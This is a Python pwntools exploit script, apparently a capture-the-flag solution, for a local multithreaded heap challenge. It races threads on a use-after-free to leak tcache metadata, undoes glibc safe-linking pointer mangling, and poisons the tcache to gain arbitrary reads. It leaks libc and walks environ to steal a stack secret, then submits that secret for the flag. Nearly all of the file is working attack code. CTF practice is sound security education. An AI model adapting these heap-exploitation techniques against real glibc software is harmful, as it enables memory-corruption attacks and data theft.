#!/bin/python 

import os
import sys
import time
import signal
import argparse
import pwn as p
import traceback

from functools import partial


SCANF_INPUT_SIZE = 1024
HEAP_FIRST_OFF   = 0xf30
LIBC_LEAK_OFF    = 0xd40

LIBC_ENVIRON_END_OFF = 0x21aec0 

DATA_PREFIX = b"MESSAGE: "
DATA_PREFIX_LEN = len(DATA_PREFIX)

TRIES = 10000

p.context.arch = 'amd64'

args = None
proc = None
elf  : p.ELF 
libc : p.ELF # f*cking LSP

gdb_pid = 0
pids = []
idx = 0

def get_server():
    global proc, elf, libc

    argv = (["sudo", "strace"] if args.strace else []) + [args.binary]
    with open("/tmp/error.log", "wb") as log:
        if args.noaslr:
            proc = p.process(argv, setuid=False, aslr=False, stderr=log)
        else:
            proc = p.process(argv, stderr=log)

    elf  = p.ELF(args.binary) if args.strace else proc.elf
    libc = elf.libc
    assert libc is not None


def restart_server():
    proc.kill()
    get_server()


def attach_gdb(gdbscript="", pause=False):
    global gdb_pid
    if not (args.gef or args.pwndbg):
        return

    gdbscript = ("gef-init\n" if args.gef else "pwndbg-init\n") + gdbscript
    gdb_pid = p.gdb.attach(proc, gdbscript=gdbscript)
    time.sleep(0.1)

    if pause:
        input("Press any key to continue gdb... ")


def detach_gdb():
    global gdb_pid
    if not gdb_pid:
        return 

    input("\nPress any key to kill gdb...\n")
    try:
        os.kill(gdb_pid, signal.SIGTERM)
    except:
        pass
    gdb_pid = 0


def proceed(msg=None, invert=False):
    if msg is not None:
        print(msg)

    try:
        if not invert:
            return 'n' not in input("[Y/n]: ").lower() 
        return 'y' not in input("[y/N]: ").lower() 
    except KeyboardInterrupt as _:
        sys.exit(0)


class thread_comm(p.remote):
    def __init__(self, host="localhost", port=1337, do_send=True):
        if proc is None:
            print("!WARNING! Proc wasnt started.")
        super().__init__(host, port)

        self.own_payload = b""
        self.do_send = do_send
        self.alloc_blown = False
        self.tcache_leak = 0

        time.sleep(0.1)


    def prompt_cmd(self, cmd, idx=b'', suffix=b''):
        if len(cmd) > SCANF_INPUT_SIZE:
            print("!WARNING! Length of cmd is larger than input max size.")
            cmd = cmd[:SCANF_INPUT_SIZE]

        if isinstance(cmd, str):
            cmd = cmd.encode()
        if isinstance(idx, int):
            idx = str(idx).encode()
        cmd += b' ' + idx + b' ' + suffix

        if self.do_send:
            self.sendline(cmd)
        else:
            self.own_payload += cmd + b' '


    def quit(self):
        self.prompt_cmd(b"quit")
        time.sleep(0.1)


    def get_payload(self):
        ret = self.own_payload[:-1]
        self.own_payload = b""
        return ret


    def printf(self, idx, do_recv=True):
        self.prompt_cmd(b"printf", idx)
        if do_recv:
            self.recvuntil(DATA_PREFIX)
            return self.recvline(drop=True)


    def malloc(self, idx):
        if self.alloc_blown:
            print("Careful! Using thread for allocation that has set alloc blown")
        self.prompt_cmd(b"malloc", idx)


    def scanf(self, idx, msg):
        self.prompt_cmd(b"scanf", idx, msg)


    def free(self, idx, check=True):
        self.prompt_cmd(b"free", idx)


    def send_flag(self, data: bytes):
        self.prompt_cmd(b"send_flag " + data)
        if self.recvuntil(b"pwn.", timeout=2) != b"":
            return self.recv(55)
        return b""


def make_workers(num: int, fn, *args):
    for i in range(num):
        pid = os.fork()
        if not pid:
            for _ in range(TRIES):
                fn(*args)
            sys.exit(0)
        pids.append(pid)


def wait_workers():
    for pid in pids:
        os.wait()
        pids.pop()


def kill_workers():     # hmh, I mean retire*
    print(pids)
    for pid in pids:
        os.kill(pid, 9) # trust me


def to_addr(b: bytes):
    return p.u64(b[:8].ljust(8, b'\x00'))


def fix_idx(idx):
    return idx if isinstance(idx, bytes) else str(idx).encode()


# We malloc, scanf 8 random bytes to buffer and then race:
# thd1: strlen(buf) => returns 8 bytes
# thd2: free(buf)   => get metadata into buf
# thd1: write(1, buf, stlren) => syscall writing out the metadata
def tcache_leak(thd1: thread_comm, thd2: thread_comm):
    scanf_bytes = p.cyclic(8)

    thd1.do_send = False
    thd1.malloc(0)
    thd1.scanf(0, scanf_bytes)
    thd1.free(0)
    make_workers(1, thd1.sendline, thd1.get_payload())
    thd1.do_send = True

    for _ in range(TRIES):
        thd2.printf(0, do_recv=False)
    wait_workers()

    results = set(thd2.clean().splitlines())
    # print(results)
    for res in results:
        ret = res[DATA_PREFIX_LEN:]
        if len(ret) == 8 and ret != scanf_bytes:
            return to_addr(ret)

    return 0


def get_tcache_leak(thd1, thd2):
    for _ in range(TRIES):
        tcache_addr = tcache_leak(thd1, thd2)
        if tcache_addr:
            print("\nTcache leak:", hex(tcache_addr))
            thd1.tcache_leak = tcache_addr
            return tcache_addr

        print("... ", end='')

    raise ValueError("No tcache leak")


def setup_custom_alloc(target_addr, thd1, thd2):
    global idx

    packed_addr = p.p64(target_addr)
    cmped_addr  = packed_addr.split(b'\x00')[0]
    whitespace_split = cmped_addr.split()
    if len(whitespace_split):
        cmped_addr = whitespace_split[0]

    if len(cmped_addr) <= 1:
        raise ValueError("Compared addr is too small")

    thd1.malloc(idx)
    thd1.malloc(idx+1)
    thd1.free(idx+1)

    failed = True
    scanf_bytes = b"scanf %d " % idx + packed_addr + b'\n'
    if p.context.log_level == 'info':
        print("\n", scanf_bytes, "\n")

    for _ in range(TRIES):
        if not os.fork():
            thd1.free(idx)
            sys.exit(0)
        thd2.send(scanf_bytes * 2000)
        os.wait()

        time.sleep(0.1)
        thd1.malloc(idx)
        data = thd1.printf(idx)
        # print(hex(to_addr(data)))

        if data[:8] == cmped_addr:
            failed = False
            # thd2.quit()
            break

    if failed:
        # import IPython; IPython.embed()
        return b""

    # p.context.log_level = "debug"
    # attach_gdb('''
    #     b malloc
    #     c
    # ''')

    thd1.malloc(idx+1)
    idx += 2
    return idx-1


# maybe check if target_addr is a mod of 16
def arbitrary_read(target_addr: int, thd1 = None, thd2 = None):
    if not thd1 or not thd2:
        thd1 = thread_comm()
        thd2 = thread_comm()
        target_addr = get_allocatable_addr(thd1, thd2, target_addr)

    try:
        idx = setup_custom_alloc(target_addr, thd1, thd2)
    except ValueError as v:
        print(v)
        return b""

    return thd1.printf(idx)


def get_allocatable_addr(thd1, thd2, addr):
    tcache_xored_loc = get_tcache_leak(thd1, thd2)
    return (tcache_xored_loc) ^ addr


def leak_libc():
    thd1, thd2 = (None, None)
    libc_leak  = b""
    for _ in range(TRIES):
        thd1 = thread_comm()
        thd2 = thread_comm()

        tcache_xored_loc = get_tcache_leak(thd1, thd2)
        target_addr  = (tcache_xored_loc << 12) + LIBC_LEAK_OFF
        target_xored = target_addr ^ tcache_xored_loc
        print("Target addr:", hex(target_addr))
        print("Target addr: (xored)", hex(target_xored))

        libc_leak = arbitrary_read(target_xored, thd1, thd2)
        if libc_leak != b"" and len(libc_leak) == 6:
            break

        restart_server()
        # attach_gdb(pause=True)

    return (thd1, thd2, to_addr(libc_leak))


def exploit():
    thd1, thd2, libc_leak = leak_libc()
    libc.address = libc_leak - libc.symbols['_IO_wfile_jumps']
    print("\nlibc leak:", hex(libc_leak))
    print("libc address:", hex(libc.address))
    print("environ addr:", hex(libc.symbols['environ']))

    environ_end_addr = libc.address + LIBC_ENVIRON_END_OFF
    print("environ_end_addr", hex(environ_end_addr))
    attach_gdb(pause=True)

    environ_end_ptr = to_addr(arbitrary_read(environ_end_addr))
    print("environ end val:", hex(environ_end_ptr))
    secret_ptr = to_addr(arbitrary_read(environ_end_ptr)) + 0x10
    print("secret ptr:", hex(secret_ptr))

    secret = arbitrary_read(secret_ptr)
    print("secret", secret)
    flag = thd2.send_flag(secret)
    print("\n\nflag:", flag)

    thd1.interactive()


def main():
    parser = argparse.ArgumentParser(usage="Usage: ./script.py [binary]")
    parser.add_argument('binary')
    parser.add_argument('-g', "--gef",    action='store_true')
    parser.add_argument('-p', "--pwndbg", action='store_true')
    parser.add_argument('-s', "--strace", action='store_true')
    parser.add_argument('-n', "--noaslr", action='store_true')
    parser.add_argument('-l', "--log-level", default='warn', type=str)

    global args
    args = parser.parse_args()
    p.context.log_level = args.log_level

    get_server()

    while True:
        try: 
            exploit()
        except Exception:
            print(traceback.format_exc())
            if proceed("Restart?"):
                restart_server()
            else:
                break

    proc.interactive()
    proc.kill()


if __name__ == '__main__':
    main()
